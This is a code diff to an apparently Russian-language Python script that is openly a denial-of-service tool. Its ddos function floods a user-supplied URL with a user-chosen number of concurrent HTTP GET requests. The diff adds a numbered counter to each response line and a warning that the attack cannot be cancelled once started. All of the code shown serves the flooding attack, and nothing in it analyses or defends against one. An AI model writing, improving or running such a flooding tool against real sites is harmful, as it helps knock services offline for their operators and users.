@@ -6,8 +6,10 @@ def clear(): os.system('cls' if os.name == 'nt' else 'clear')
 def ddos(url, amount):
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = [executor.submit(requests.get, url) for _ in range(int(amount))]
+        a = 1
         for future in concurrent.futures.as_completed(futures):
-            print(Fore.BLUE + f"Ответ от {url}: {future.result().status_code}" + Fore.RESET)
+            print(Fore.BLUE + f"{a}: Ответ от {url}: {future.result().status_code}" + Fore.RESET)
+            a+=1
     print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
     return time.sleep(4)
 
@@ -35,6 +37,7 @@ def start():
         os.execl(python_exec, python_exec, *sys.argv)
     
     if a == 1:
+        print(Fore.RED + 'ВНИМАНИЕ! Процесс DDOSa будет отменить будет невозможно!')
         url = input(Fore.CYAN + 'Введите ссылку>>> ' + Fore.YELLOW)
         amount = input(Fore.CYAN + 'Введите количество запросов>>> ' + Fore.YELLOW)
         ddos(url,amount)
